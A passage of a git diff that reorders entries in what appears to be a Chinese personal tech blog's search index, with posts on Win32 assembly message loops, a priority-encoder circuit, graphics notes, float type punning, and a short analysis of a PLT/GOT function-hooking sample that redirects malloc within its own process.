@@ -3298,30 +3300,6 @@ case配合，建立分支</p>
       </categories>
   </entry>
   <entry>
-    <title>用汇编编写消息系统 (1) 一些基本知识点、向操作系统注册一个窗口</title>
-    <url>/yi-xiao-xi-wei-dao-xiang-de-you-xian-zhuang-tai-ji-li-nian-windows-cheng-xu-she-ji-hui-bian/</url>
-    <content><![CDATA[<h2 id="背景">背景</h2>
-<p>会开发才会逆向，然而笔者越来越发现其实自己对实际生产环境中的Windows程序设计理念一无所知，谨以此系列文章记录</p>
-<h2 id="正文">正文</h2>
-<p>笔者有过用最蠢的方式开发Windows窗体程序的经验，示例程序是计算器，要求是支持分数</p>
-<p>前期觉得挺简单的，越到收尾越发现一系列问题，简单来说有以下：</p>
-<p>如果要支持括号运算的话，手写符号顺序树太难了，于是笔者做法是托管JSengine，使用JS的eval函数</p>
-<p>由于需要支持分数线，所以必须符号和数字分开，然后就会造成delete键的逻辑需要非常多的if，因为需要判断接下来删除的是什么，是普通符号还是分数线还是数字？</p>
-<p>而其实Windows窗体程序并不是这样的设计逻辑，题主在开发初期找了网上一些程序源码借鉴，找到的三四份源码都是这种错误的设计逻辑，因此笔者也跟着这个逻辑写，陷入了误区</p>
-<p>其实这里最重要的一点就是简单CUI程序和Windows窗体程序之间的一个不同点：</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181052750.png" /></p>
-<p>回到计算器的例子，用户点击任何按钮都是顺序，次数不定的，这就导致了我前期写函数逻辑，写封装很爽，一写一个爽，但是后期却需要一堆if嵌套判断调用逻辑顺序，同时如果需要加入异常输入检测的话，if数量，层数直接爆炸，完全没法继续写，最终导致重写整个逻辑</p>
-<p>回到正确做法，正确做法应该是用一个while
-true把消息获取，消息处理逻辑括起来，再加一句break（当程序退出时触发）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.while TRUE</span><br><span class="line">        invoke GetMessage,addr @stMsg,NULL,0,0</span><br><span class="line">        .break .if eax == 0</span><br><span class="line">        invoke TranslateMessage,addr @stMsg</span><br><span class="line">        invoke DispatchMessage,addr @stMsg</span><br><span class="line">.endw</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>开发</category>
-        <category>Windows</category>
-      </categories>
-  </entry>
-  <entry>
     <title>用汇编编写消息系统 (2.1) 三种常见消息处理机制概念及设计</title>
     <url>/yi-xiao-xi-wei-dao-xiang-de-you-xian-zhuang-tai-ji-li-nian-windows-cheng-xu-she-ji-hui-bian-2/</url>
     <content><![CDATA[<p>上一篇讲了最常见的一种：</p>
@@ -3352,6 +3330,60 @@ peekMessage
       <categories>
         <category>开发</category>
         <category>Windows</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>用汇编编写消息系统 (1) 一些基本知识点、向操作系统注册一个窗口</title>
+    <url>/yi-xiao-xi-wei-dao-xiang-de-you-xian-zhuang-tai-ji-li-nian-windows-cheng-xu-she-ji-hui-bian/</url>
+    <content><![CDATA[<h2 id="背景">背景</h2>
+<p>会开发才会逆向，然而笔者越来越发现其实自己对实际生产环境中的Windows程序设计理念一无所知，谨以此系列文章记录</p>
+<h2 id="正文">正文</h2>
+<p>笔者有过用最蠢的方式开发Windows窗体程序的经验，示例程序是计算器，要求是支持分数</p>
+<p>前期觉得挺简单的，越到收尾越发现一系列问题，简单来说有以下：</p>
+<p>如果要支持括号运算的话，手写符号顺序树太难了，于是笔者做法是托管JSengine，使用JS的eval函数</p>
+<p>由于需要支持分数线，所以必须符号和数字分开，然后就会造成delete键的逻辑需要非常多的if，因为需要判断接下来删除的是什么，是普通符号还是分数线还是数字？</p>
+<p>而其实Windows窗体程序并不是这样的设计逻辑，题主在开发初期找了网上一些程序源码借鉴，找到的三四份源码都是这种错误的设计逻辑，因此笔者也跟着这个逻辑写，陷入了误区</p>
+<p>其实这里最重要的一点就是简单CUI程序和Windows窗体程序之间的一个不同点：</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181052750.png" /></p>
+<p>回到计算器的例子，用户点击任何按钮都是顺序，次数不定的，这就导致了我前期写函数逻辑，写封装很爽，一写一个爽，但是后期却需要一堆if嵌套判断调用逻辑顺序，同时如果需要加入异常输入检测的话，if数量，层数直接爆炸，完全没法继续写，最终导致重写整个逻辑</p>
+<p>回到正确做法，正确做法应该是用一个while
+true把消息获取，消息处理逻辑括起来，再加一句break（当程序退出时触发）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.while TRUE</span><br><span class="line">        invoke GetMessage,addr @stMsg,NULL,0,0</span><br><span class="line">        .break .if eax == 0</span><br><span class="line">        invoke TranslateMessage,addr @stMsg</span><br><span class="line">        invoke DispatchMessage,addr @stMsg</span><br><span class="line">.endw</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>开发</category>
+        <category>Windows</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>关于priority encoder芯片的简单小分析</title>
+    <url>/guan-yu-priority-encoder-xin-pian-de-jian-dan-xiao-fen-xi/</url>
+    <content><![CDATA[<h2 id="背景">背景</h2>
+<p>CIS221的实验</p>
+<h2 id="正文">正文</h2>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172110571.png" /></p>
+<p>电路图如上</p>
+<p>首先看第一位bit0</p>
+<p>bit0先用与/与非门控制, 当其他更高级的信号为0时与/与非门才会放过去</p>
+<p>u13到u15的或门是选择</p>
+<p>分别只有一个可能被选择通过</p>
+<p>并且对应情况下会让bit1和bit2 bit3也改变</p>
+<p>比如</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172110485.png" /></p>
+<p>u13通过去了一个信号到bit0,但是并不知道这个bit0的信号是来自谁</p>
+<p>所以需要这个信号连到bit1等处,来进一步判断来自谁</p>
+<p>现在问题来了....</p>
+<p>这个该怎么从0设计呢...</p>
+<p>毕竟我是看着视频写的</p>
+<p>总感觉逆向很好考虑</p>
+<p>但是正向完全想不出来</p>
+]]></content>
+      <categories>
+        <category>硬件</category>
+        <category>芯片</category>
       </categories>
   </entry>
   <entry>
@@ -3386,36 +3418,6 @@ Deck游戏机内部，wifi模块与SSD间隔很近，互相之间有干扰，官
       <tags>
         <tag>DELL</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>关于priority encoder芯片的简单小分析</title>
-    <url>/guan-yu-priority-encoder-xin-pian-de-jian-dan-xiao-fen-xi/</url>
-    <content><![CDATA[<h2 id="背景">背景</h2>
-<p>CIS221的实验</p>
-<h2 id="正文">正文</h2>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172110571.png" /></p>
-<p>电路图如上</p>
-<p>首先看第一位bit0</p>
-<p>bit0先用与/与非门控制, 当其他更高级的信号为0时与/与非门才会放过去</p>
-<p>u13到u15的或门是选择</p>
-<p>分别只有一个可能被选择通过</p>
-<p>并且对应情况下会让bit1和bit2 bit3也改变</p>
-<p>比如</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172110485.png" /></p>
-<p>u13通过去了一个信号到bit0,但是并不知道这个bit0的信号是来自谁</p>
-<p>所以需要这个信号连到bit1等处,来进一步判断来自谁</p>
-<p>现在问题来了....</p>
-<p>这个该怎么从0设计呢...</p>
-<p>毕竟我是看着视频写的</p>
-<p>总感觉逆向很好考虑</p>
-<p>但是正向完全想不出来</p>
-]]></content>
-      <categories>
-        <category>硬件</category>
-        <category>芯片</category>
-      </categories>
   </entry>
   <entry>
     <title>几个关系</title>
@@ -3500,8 +3502,8 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181052122
 ]]></content>
       <categories>
         <category>信息安全</category>
-        <category>二进制</category>
         <category>笔记</category>
+        <category>二进制</category>
         <category>编译原理</category>
       </categories>
       <tags>
@@ -3532,8 +3534,8 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101051
 src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101859.png" /></p>
 ]]></content>
       <categories>
-        <category>杂谈</category>
         <category>开发</category>
+        <category>杂谈</category>
         <category>语言学</category>
       </categories>
   </entry>
@@ -3552,18 +3554,6 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113097
       </categories>
   </entry>
   <entry>
-    <title>参考文献1 unix系统早期开发情况</title>
-    <url>/can-kao-wen-xian-1/</url>
-    <content><![CDATA[<p>https://www.read.seas.harvard.edu/~kohler/class/aosref/ritchie84evolution.pdf</p>
-<p>unix系统早期状况(在某些方面较大程度上反映了当代微型Linux系统状况)</p>
-<p>重点:P7 P10 P11</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>存档</category>
-      </categories>
-  </entry>
-  <entry>
     <title>参数传递和异常传递的异同之处</title>
     <url>/can-shu-chuan-di-he-yi-chang-chuan-di-de-yi-tong-zhi-chu/</url>
     <content><![CDATA[<p>参数的传递和异常的传递有相似之处</p>
@@ -3576,6 +3566,18 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113097
       <tags>
         <tag>C++简明进阶教程</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>参考文献1 unix系统早期开发情况</title>
+    <url>/can-kao-wen-xian-1/</url>
+    <content><![CDATA[<p>https://www.read.seas.harvard.edu/~kohler/class/aosref/ritchie84evolution.pdf</p>
+<p>unix系统早期状况(在某些方面较大程度上反映了当代微型Linux系统状况)</p>
+<p>重点:P7 P10 P11</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>存档</category>
+      </categories>
   </entry>
   <entry>
     <title>参考文献2 GCC常用参数 GDB常用指令</title>
@@ -3679,32 +3681,6 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101812
       </categories>
   </entry>
   <entry>
-    <title>可悲</title>
-    <url>/ke-bei/</url>
-    <content><![CDATA[<p>人真正可悲的不是没有金钱，没有能力，或者没有权利</p>
-<p>因为这些到最后都还有死路一条</p>
-<p>人真正可悲的是没有童年，没有青春</p>
-<p>这甚至连死亡都无法弥补</p>
-<p>很多事情看破之后，另一些事情就明白许多了</p>
-<p>真的很庆幸，在高中的时候遇到了一个真正有资格被称作是人民教师的班主任</p>
-<p>但可悲的是, 也就只遇到过这么一个真正想要育人的好老师</p>
-<p>回想起来给他写的那些肺腑之言也确实是作词、玩音乐的一个开端</p>
-<p>音乐也罢，它对我的历史任务已经完成了</p>
-<p><strong>让人成为一个人，而非一头动物的方法，我认为只有涉猎纯粹的，不功利的艺术</strong></p>
-<p>一种亲身的经历的氛围，而非任何形式的手艺，也绝非单纯的教育</p>
-<p>经历过，融入过，淡然，离场，然后变得更像是一个人了</p>
-<p>做事可以为了有用，但不能只为了有用</p>
-<p>活着其实就是为了看看没看过的东西, 对自己感兴趣的东西感兴趣</p>
-<p>能有真正的热爱居然是我唯一的后盾，完全断裂的社会性关系，没有港口的叶子</p>
-<p>也就只能靠自己漂了</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181048207.jpeg" /></p>
-]]></content>
-      <categories>
-        <category>黑历史与垃圾</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Windows API (3) GetModuleHandle 逆向</title>
     <url>/ju-bing-xiang-jie-bi-ji-3-windows-xi-tong-api-getmodulehandle-ni-xiang-bi-ji/</url>
     <content><![CDATA[<p>示例代码如下(C++),有一些无效的内容,比如string什么的,无视即可</p>
@@ -3742,6 +3718,32 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101252
       </categories>
   </entry>
   <entry>
+    <title>可悲</title>
+    <url>/ke-bei/</url>
+    <content><![CDATA[<p>人真正可悲的不是没有金钱，没有能力，或者没有权利</p>
+<p>因为这些到最后都还有死路一条</p>
+<p>人真正可悲的是没有童年，没有青春</p>
+<p>这甚至连死亡都无法弥补</p>
+<p>很多事情看破之后，另一些事情就明白许多了</p>
+<p>真的很庆幸，在高中的时候遇到了一个真正有资格被称作是人民教师的班主任</p>
+<p>但可悲的是, 也就只遇到过这么一个真正想要育人的好老师</p>
+<p>回想起来给他写的那些肺腑之言也确实是作词、玩音乐的一个开端</p>
+<p>音乐也罢，它对我的历史任务已经完成了</p>
+<p><strong>让人成为一个人，而非一头动物的方法，我认为只有涉猎纯粹的，不功利的艺术</strong></p>
+<p>一种亲身的经历的氛围，而非任何形式的手艺，也绝非单纯的教育</p>
+<p>经历过，融入过，淡然，离场，然后变得更像是一个人了</p>
+<p>做事可以为了有用，但不能只为了有用</p>
+<p>活着其实就是为了看看没看过的东西, 对自己感兴趣的东西感兴趣</p>
+<p>能有真正的热爱居然是我唯一的后盾，完全断裂的社会性关系，没有港口的叶子</p>
+<p>也就只能靠自己漂了</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181048207.jpeg" /></p>
+]]></content>
+      <categories>
+        <category>黑历史与垃圾</category>
+      </categories>
+  </entry>
+  <entry>
     <title>回调函数和匿名回调法</title>
     <url>/hui-diao-han-shu/</url>
     <content><![CDATA[<p>之前在Unity开发的时候遇到一个现象：同样是unity对外暴露的接口函数，同样都是程序自身完全没有调用过（但都是unity会调用的）但是rider对其语法高亮却不同，这主要是回调函数和普通函数的区别</p>
@@ -3768,6 +3770,38 @@ data-cites="adr即可">@adr即可</span>，这样就从控制权就从系统函�
       </categories>
       <tags>
         <tag>回调函数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>图形学笔记1</title>
+    <url>/tu-xing-xue-bi-ji-1/</url>
+    <content><![CDATA[<p>参考资料:https://www.bilibili.com/video/BV1X7411F744 GAMES 101</p>
+<ol type="1">
+<li><p>本系列不直接关注OpenGL的使用, 主要是探讨技术原理</p></li>
+<li><p>计算机视觉和图形学的关系</p>
+<ol type="1">
+<li><p>什么是model, model是一种序列化后的数据(非文本的数据),
+用于表示三维空间的物体, 而渲染就是把这些数据转换成图片的过程</p></li>
+<li><p>计算机视觉有点类似于render的逆过程,
+是把图片转换成模型数据的过程</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071534909.png"
+alt="image-20230407153404878" />
+<figcaption aria-hidden="true">image-20230407153404878</figcaption>
+</figure></li>
+<li><p>计算机视觉一般需要人工智能介入</p></li>
+</ol></li>
+</ol>
+<p>一些网站:</p>
+<p>https://games-cn.org/intro-graphics/</p>
+<p>https://sites.cs.ucsb.edu/~lingqi/teaching/games101.html</p>
+]]></content>
+      <categories>
+        <category>图形学笔记</category>
+      </categories>
+      <tags>
+        <tag>图形学</tag>
       </tags>
   </entry>
   <entry>
@@ -3872,38 +3906,6 @@ alt="image-20230407162308384" />
 <p>转置一个矩阵乘法表达式会导致括号拆开， 然后反过来乘法顺序</p>
 <h3 id="向量两种乘法的矩阵表达形式">向量两种乘法的矩阵表达形式</h3>
 <p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071722819.png" alt="image-20230407172214780" style="zoom:50%;" /></p>
-]]></content>
-      <categories>
-        <category>图形学笔记</category>
-      </categories>
-      <tags>
-        <tag>图形学</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>图形学笔记1</title>
-    <url>/tu-xing-xue-bi-ji-1/</url>
-    <content><![CDATA[<p>参考资料:https://www.bilibili.com/video/BV1X7411F744 GAMES 101</p>
-<ol type="1">
-<li><p>本系列不直接关注OpenGL的使用, 主要是探讨技术原理</p></li>
-<li><p>计算机视觉和图形学的关系</p>
-<ol type="1">
-<li><p>什么是model, model是一种序列化后的数据(非文本的数据),
-用于表示三维空间的物体, 而渲染就是把这些数据转换成图片的过程</p></li>
-<li><p>计算机视觉有点类似于render的逆过程,
-是把图片转换成模型数据的过程</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071534909.png"
-alt="image-20230407153404878" />
-<figcaption aria-hidden="true">image-20230407153404878</figcaption>
-</figure></li>
-<li><p>计算机视觉一般需要人工智能介入</p></li>
-</ol></li>
-</ol>
-<p>一些网站:</p>
-<p>https://games-cn.org/intro-graphics/</p>
-<p>https://sites.cs.ucsb.edu/~lingqi/teaching/games101.html</p>
 ]]></content>
       <categories>
         <category>图形学笔记</category>
@@ -4208,6 +4210,13 @@ R_t\]</span></p>
 <p>也就是说优先保证相机移到世界坐标系, 然后让其他物件绑定到相机上面</p>
 <p>对所有世界物体做出M变换后就可以开始准备下一阶段了</p>
 <h2 id="投影变换">投影变换</h2>
+<p>分为两种投影变换 正交投影(orthographic)和透视投影(perspective)</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304100822603.png"
+alt="image-20230410082203555" />
+<figcaption aria-hidden="true">image-20230410082203555</figcaption>
+</figure>
 ]]></content>
       <categories>
         <category>图形学笔记</category>
@@ -4683,6 +4692,34 @@ QEMU只能模拟MIPS-CPU环境，但是无法模拟路由器当中的<strong>其
       </tags>
   </entry>
   <entry>
+    <title>强制类型转换的缺省细节和IEEE 754 规范</title>
+    <url>/qiang-zhi-lei-xing-zhuan-huan-he-ieee-754-gui-fan/</url>
+    <content><![CDATA[<p>随便看了一些东西</p>
+<p>算是某种意义上真正理解了强制类型转换的安全性和风险性</p>
+<p>本文主要讨论的是C语言环境下</p>
+<p>https://www.youtube.com/watch?v=p8u_k2LIZyo</p>
+<p>主要启发如上</p>
+<p>结论是IEEE
+754下的小数在某种意义上相当于int的以2为底的对数（在二进制下对float取对数再进行一些简单的四则运算后即可获得二进制底层下的，二者之间向下取整安全转换公式和强制按地址转换公式）</p>
+<p>但是以下几个知识点阻止了我们高效操作（位运算）小数</p>
+<p>float是无法进行位操作的</p>
+<p>float和dw和int一般是位宽相同的（因为现在是2021年）</p>
+<p>float转dw并不会得到内存上排列相同的一些比特位，比如3.01转dw得到3（0000000000....0011）</p>
+<p>所以我们需要用到不安全的越界指针</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">float a;</span><br><span class="line">long b;</span><br><span class="line">b=*  (long*) &amp;a;</span><br></pre></td></tr></table></figure>
+<p>所以笔者终于彻底明白了这个括号双星是什么含义了...</p>
+<p>实际上是对地址的转义再解引用</p>
+<p>强转地址的解释方式(也就是括号内内容)</p>
+<p>然后再解引用地址,如果这时候直接打印b的值,会得到一个很大的数字,原因是IEEE
+754的小数规范是科学计数法</p>
+]]></content>
+      <categories>
+        <category>信息安全</category>
+        <category>二进制</category>
+        <category>开发</category>
+      </categories>
+  </entry>
+  <entry>
     <title>寄存器和触发器</title>
     <url>/ji-cun-qi-he-hong-fa-qi/</url>
     <content><![CDATA[<p><img
@@ -4722,44 +4759,6 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113003
         <tag>匿名函数</tag>
         <tag>指针</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>强制类型转换的缺省细节和IEEE 754 规范</title>
-    <url>/qiang-zhi-lei-xing-zhuan-huan-he-ieee-754-gui-fan/</url>
-    <content><![CDATA[<p>随便看了一些东西</p>
-<p>算是某种意义上真正理解了强制类型转换的安全性和风险性</p>
-<p>本文主要讨论的是C语言环境下</p>
-<p>https://www.youtube.com/watch?v=p8u_k2LIZyo</p>
-<p>主要启发如上</p>
-<p>结论是IEEE
-754下的小数在某种意义上相当于int的以2为底的对数（在二进制下对float取对数再进行一些简单的四则运算后即可获得二进制底层下的，二者之间向下取整安全转换公式和强制按地址转换公式）</p>
-<p>但是以下几个知识点阻止了我们高效操作（位运算）小数</p>
-<p>float是无法进行位操作的</p>
-<p>float和dw和int一般是位宽相同的（因为现在是2021年）</p>
-<p>float转dw并不会得到内存上排列相同的一些比特位，比如3.01转dw得到3（0000000000....0011）</p>
-<p>所以我们需要用到不安全的越界指针</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">float a;</span><br><span class="line">long b;</span><br><span class="line">b=*  (long*) &amp;a;</span><br></pre></td></tr></table></figure>
-<p>所以笔者终于彻底明白了这个括号双星是什么含义了...</p>
-<p>实际上是对地址的转义再解引用</p>
-<p>强转地址的解释方式(也就是括号内内容)</p>
-<p>然后再解引用地址,如果这时候直接打印b的值,会得到一个很大的数字,原因是IEEE
-754的小数规范是科学计数法</p>
-]]></content>
-      <categories>
-        <category>信息安全</category>
-        <category>二进制</category>
-        <category>开发</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>想写点东西但是不知道从何讲起</title>
-    <url>/xiang-xie-dian-dong-xi-dan-shi-bu-zhi-dao-cong-he-jiang-qi/</url>
-    <content><![CDATA[<p>https://www.youtube.com/watch?v=siQJhIp-UTU&amp;list=RDh7D27BYfjgQ&amp;index=3</p>
-<p>此中有真意，欲辨已忘言</p>
-]]></content>
-      <categories>
-        <category>黑历史与垃圾</category>
-      </categories>
   </entry>
   <entry>
     <title>指针和引用的区别(1) 表象区别</title>
@@ -4803,6 +4802,16 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113003
       </tags>
   </entry>
   <entry>
+    <title>想写点东西但是不知道从何讲起</title>
+    <url>/xiang-xie-dian-dong-xi-dan-shi-bu-zhi-dao-cong-he-jiang-qi/</url>
+    <content><![CDATA[<p>https://www.youtube.com/watch?v=siQJhIp-UTU&amp;list=RDh7D27BYfjgQ&amp;index=3</p>
+<p>此中有真意，欲辨已忘言</p>
+]]></content>
+      <categories>
+        <category>黑历史与垃圾</category>
+      </categories>
+  </entry>
+  <entry>
     <title>排序算法笔记</title>
     <url>/pai-xu-suan-fa-bi-ji/</url>
     <content><![CDATA[<h2 id="选择排序">选择排序</h2>
@@ -4831,16 +4840,6 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172120694
         <category>笔记</category>
         <category>校内</category>
         <category>离散</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>杂记</title>
-    <url>/za-ji-2/</url>
-    <content><![CDATA[<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172158991.png" /></p>
-]]></content>
-      <categories>
-        <category>黑历史与垃圾</category>
       </categories>
   </entry>
   <entry>
@@ -4884,9 +4883,9 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101164
   </entry>
   <entry>
     <title>杂记</title>
-    <url>/za-ji/</url>
-    <content><![CDATA[<p>我也不是多喜欢保持纯粹理性 力求过程正确</p>
-<p>我只是喜欢 <strong>喜欢保持纯粹理性</strong> 的感觉</p>
+    <url>/za-ji-2/</url>
+    <content><![CDATA[<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172158991.png" /></p>
 ]]></content>
       <categories>
         <category>黑历史与垃圾</category>
@@ -4907,6 +4906,16 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101164
       <categories>
         <category>开发</category>
         <category>Windows</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>杂记</title>
+    <url>/za-ji/</url>
+    <content><![CDATA[<p>我也不是多喜欢保持纯粹理性 力求过程正确</p>
+<p>我只是喜欢 <strong>喜欢保持纯粹理性</strong> 的感觉</p>
+]]></content>
+      <categories>
+        <category>黑历史与垃圾</category>
       </categories>
   </entry>
   <entry>
@@ -4944,6 +4953,33 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172100245
         <category>笔记</category>
         <category>校内</category>
         <category>离散</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>爱奇艺Hook库的一小段源码分析</title>
+    <url>/ai-qi-yi-hook-ku-de-yi-xiao-duan-yuan-ma-fen-xi/</url>
+    <content><![CDATA[<h2 id="背景">背景</h2>
+<p>例子实在是太好了，必须分析一波</p>
+<h2 id="例题源码">例题源码</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;inttypes.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;test.h&gt;</span><br><span class="line"></span><br><span class="line">#define PAGE_START(addr) ((addr) &amp; PAGE_MASK)</span><br><span class="line">#define PAGE_END(addr)   (PAGE_START(addr) + PAGE_SIZE)</span><br><span class="line"></span><br><span class="line">void *my_malloc(size_t size)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%zu bytes memory are allocated by libtest.so\n&quot;, size);</span><br><span class="line">    return malloc(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void hook()</span><br><span class="line">&#123;</span><br><span class="line">    char       line[512];</span><br><span class="line">    FILE      *fp;</span><br><span class="line">    uintptr_t  base_addr = 0;</span><br><span class="line">    uintptr_t  addr;</span><br><span class="line"></span><br><span class="line">    //find base address of libtest.so</span><br><span class="line">    if(NULL == (fp = fopen(&quot;/proc/self/maps&quot;, &quot;r&quot;))) return;</span><br><span class="line">    while(fgets(line, sizeof(line), fp))</span><br><span class="line">    &#123;</span><br><span class="line">        if(NULL != strstr(line, &quot;libtest.so&quot;) &amp;&amp;</span><br><span class="line">           sscanf(line, &quot;%&quot;PRIxPTR&quot;-%*lx %*4s 00000000&quot;, &amp;base_addr) == 1)</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    if(0 == base_addr) return;</span><br><span class="line"></span><br><span class="line">    //the absolute address</span><br><span class="line">    addr = base_addr + 0x3f90;</span><br><span class="line">    </span><br><span class="line">    //add write permission</span><br><span class="line">    mprotect((void *)PAGE_START(addr), PAGE_SIZE, PROT_READ  PROT_WRITE);</span><br><span class="line"></span><br><span class="line">    //replace the function address</span><br><span class="line">    *(void **)addr = my_malloc;</span><br><span class="line"></span><br><span class="line">    //clear instruction cache</span><br><span class="line">    __builtin___clear_cache((void *)PAGE_START(addr), (void *)PAGE_END(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    hook();</span><br><span class="line">    </span><br><span class="line">    say_hello();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>主要看第十一行和第四十二行</p>
+<h2 id="正文">正文</h2>
+<p>第十一行是一个返回值为空指针的函数，这里目前还不太知道为什么，因为如果改成void是不影响后面操作的，姑且先认为是原作者的编写习惯</p>
+<p>第四十二行 是一个改变指针解读的操作，很精妙，也很基础</p>
+<p>主题逻辑是：</p>
+<ol type="1">
+<li>读入函数头表并定位基址</li>
+<li>改变页权限</li>
+<li>改写函数地址指向</li>
+<li>清除指令地址缓存__builtin___clear_cache，迫使CPU重新定位</li>
+<li>返回</li>
+</ol>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>开发</category>
+        <category>存档</category>
+        <category>Windows</category>
       </categories>
   </entry>
   <entry>
@@ -5096,8 +5132,8 @@ C处于继承树上的同一侧分支(说明C不是fakeC)</p>
 ]]></content>
       <categories>
         <category>信息安全</category>
-        <category>二进制</category>
         <category>笔记</category>
+        <category>二进制</category>
         <category>开发</category>
         <category>存档</category>
         <category>C++</category>
@@ -5105,33 +5141,6 @@ C处于继承树上的同一侧分支(说明C不是fakeC)</p>
       <tags>
         <tag>cpp</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>爱奇艺Hook库的一小段源码分析</title>
-    <url>/ai-qi-yi-hook-ku-de-yi-xiao-duan-yuan-ma-fen-xi/</url>
-    <content><![CDATA[<h2 id="背景">背景</h2>
-<p>例子实在是太好了，必须分析一波</p>
-<h2 id="例题源码">例题源码</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;inttypes.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;test.h&gt;</span><br><span class="line"></span><br><span class="line">#define PAGE_START(addr) ((addr) &amp; PAGE_MASK)</span><br><span class="line">#define PAGE_END(addr)   (PAGE_START(addr) + PAGE_SIZE)</span><br><span class="line"></span><br><span class="line">void *my_malloc(size_t size)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%zu bytes memory are allocated by libtest.so\n&quot;, size);</span><br><span class="line">    return malloc(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void hook()</span><br><span class="line">&#123;</span><br><span class="line">    char       line[512];</span><br><span class="line">    FILE      *fp;</span><br><span class="line">    uintptr_t  base_addr = 0;</span><br><span class="line">    uintptr_t  addr;</span><br><span class="line"></span><br><span class="line">    //find base address of libtest.so</span><br><span class="line">    if(NULL == (fp = fopen(&quot;/proc/self/maps&quot;, &quot;r&quot;))) return;</span><br><span class="line">    while(fgets(line, sizeof(line), fp))</span><br><span class="line">    &#123;</span><br><span class="line">        if(NULL != strstr(line, &quot;libtest.so&quot;) &amp;&amp;</span><br><span class="line">           sscanf(line, &quot;%&quot;PRIxPTR&quot;-%*lx %*4s 00000000&quot;, &amp;base_addr) == 1)</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    if(0 == base_addr) return;</span><br><span class="line"></span><br><span class="line">    //the absolute address</span><br><span class="line">    addr = base_addr + 0x3f90;</span><br><span class="line">    </span><br><span class="line">    //add write permission</span><br><span class="line">    mprotect((void *)PAGE_START(addr), PAGE_SIZE, PROT_READ  PROT_WRITE);</span><br><span class="line"></span><br><span class="line">    //replace the function address</span><br><span class="line">    *(void **)addr = my_malloc;</span><br><span class="line"></span><br><span class="line">    //clear instruction cache</span><br><span class="line">    __builtin___clear_cache((void 